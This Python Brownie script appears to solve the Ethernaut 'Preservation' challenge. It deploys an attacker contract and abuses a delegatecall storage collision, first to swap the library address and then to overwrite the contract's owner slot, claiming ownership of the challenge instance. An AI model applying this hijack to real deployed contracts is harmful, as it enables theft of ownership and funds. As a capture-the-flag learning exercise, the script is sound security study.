from scripts.helper.utils import *
from scripts.helper.account import _from, acc
from brownie import Preservation, PreservationAttack

##########################################
# The goal of this level is for you to claim ownership of the instance you are given.
#########################################

# solve the challenge
def solve_challenge(locally=False):
    # load challenge
    if not locally:
        preservation = load_challenge(ContractObject=Preservation, instance_key='preservation')
    else:
        preservation = deploy_locally(ContractObject=Preservation, from_account=_from)
    
    # deploy attacker contract
    pattack = PreservationAttack.deploy(preservation.address, _from)

    # call `setFirstTime()` in preservation from the attacker contract
    pattack.setFirstTimeExploit(_from)

    # now that the variable `timeZone1Library` has now become the preservation attacker contract 
    # call the fake `setTime()` function in the attacker contract (library) to modify the 3rd storage slot in Preservation (`owner`)
    preservation.setFirstTime(0, _from)

    # check that we are the owner
    owner_assertion = preservation.owner() == acc.address
    print(f"My address is the contract owner {owner_assertion}")

    return owner_assertion

def main():
    solve_challenge()
